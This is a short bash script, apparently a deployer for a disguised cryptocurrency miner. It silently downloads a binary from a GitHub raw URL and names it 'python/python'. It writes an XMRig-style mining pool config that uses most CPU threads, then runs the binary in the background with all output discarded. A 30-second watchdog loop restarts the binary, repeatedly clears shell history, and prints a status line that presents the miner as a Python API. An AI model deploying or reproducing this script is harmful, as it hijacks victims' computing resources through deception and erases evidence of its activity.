#!/bin/bash

DOMAIN=$1      # domain:port
HOSTNAME=$2    # hostname
CONFIG="setting.json"
BINARY="python/python"
WORKDIR=$(pwd)

# Tải binary nếu chưa có
if [ ! -f "$BINARY" ]; then
    echo "Downloading binary..."
    curl -sL -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz >/dev/null 2>&1
    tar -xzf python.tar.gz
    rm -f python.tar.gz
fi

# Tạo config.json nếu chưa có
if [ ! -f "$CONFIG" ]; then
    cat > "$CONFIG" <<EOF
{
  "pools": [
    {
      "url": "$DOMAIN",
      "user": "$HOSTNAME",
      "pass": "x",
      "tls": true,
      "keepalive": true
    }
  ],
  "cpu": {
    "enabled": true,
    "max-threads-hint": 60
  }
}
EOF
fi

# Hàm start process
start_process() {
    nohup "$WORKDIR/$BINARY" -c "$WORKDIR/$CONFIG" >/dev/null 2>&1 &
    echo "Process restarted"
}

# Nếu chưa chạy thì start
if pgrep -f "$BINARY" > /dev/null; then
    echo "Process is running api python"
else
    start_process
fi

# Vòng lặp kiểm tra mỗi 30s
while true; do
    if pgrep -f "$BINARY" > /dev/null; then
        echo "Process is running api python"
    else
        start_process
    fi
    history -c
    history -w
    sleep 30
done
